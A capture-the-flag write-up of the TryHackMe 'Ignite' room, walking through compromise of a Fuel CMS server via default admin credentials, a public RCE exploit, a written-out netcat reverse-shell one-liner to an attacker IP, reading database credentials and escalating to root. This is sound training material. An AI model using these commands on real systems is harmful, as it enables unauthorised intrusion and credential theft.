# Ignite | THM
### Difficulty level: Easy
--------------------------------

Firstly, I’ll start with nmap tool for enumeration.
```bash
<nmap -sC -sV <ip-address>>
```

Results:

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*FMjt7TYKLOmhgXswDFD_GQ.png)

There is 1 open port. This is http port and we get a http title : “welcome to FUEL CMS”.
this title telling us about which CMS this site is using.
In addition there is another header that can help us :
http-robots.txt and /fuel/.
I’ll check robots.txt file and I can find fuel directory.
when I connected to this dir there is a login page from Fuel CMS.

![image](https://miro.medium.com/v2/resize:fit:720/format:webp/1*FXi2VtDQeo_SLao1OSN27Q.png)

I don't know what to do yet but so i will try to use the default credentials. 
{admin:admin} and I found myself inside the system.

![image](https://miro.medium.com/v2/resize:fit:720/format:webp/1*8iVZ8ULKGNBmXJwe2-KBpg.png)

I checked for an input that I can inject there a code that will give me php reverse-shell.
I didn't find any. so it's time to search 
vulnerabilities in FUEL CMS in Metasploit. look what I found!
there is RCE vulnerability so I'm going to download it to my kali.

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*sjjHCrIoPaaRJD-dJm3brA.png)

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*h_ZhDg1KviwTTAWV4OKeIw.png)

give it permissions.
```bash
chmod 777 50477.py
```
Started to read that code to understand the way it works and how to exploit with it.

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*oJkyyZbOBbvy2PyMtklD2w.png)

I got type of connection and a type of shell. in that shell I tried to
execute some commands and ‘ls’ was the command that works.
so lets try to execute a reverse shell code for a real connection.
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker-ip><port> >/tmp/f
```

and a netcat listener on our machine on the same port.

```bash
nc -lnvp 2222
```
then we got the wanted reverse shell.

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*sei0zW2PoLyl5t28_uw3wg.png)

So the first command will be:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
This command gives us a better shell and comfortable to use.
next command will be ‘ls’ and flag.txt found!!!

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*tecoWBPdkdAc1DrpO7mMPA.png)

now I'm going back to the first page that appeared in this CTF and there
I can see where the database is located.

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*jA8lUTk4obErtyeiPhJ0fQ.png)

```bash
cat /var/www/html/fuel/application/config/database.php
```

Results:

![image](https://miro.medium.com/v2/resize:fit:786/format:webp/1*27WqwtFZz_1O6bI3E3yfzg.png)

So, It's time to root.
```bash
su root
```

Enter the password and move to /root dir and there is the root.txt flag!

![image](https://miro.medium.com/v2/resize:fit:786/format:webp/1*OiJYtpCw6ZhYjan2tPm9MQ.png)

The end.

Happy Hacking!

**Written by Alon Presman, Penetration Tester and Ethical Hacker.**




























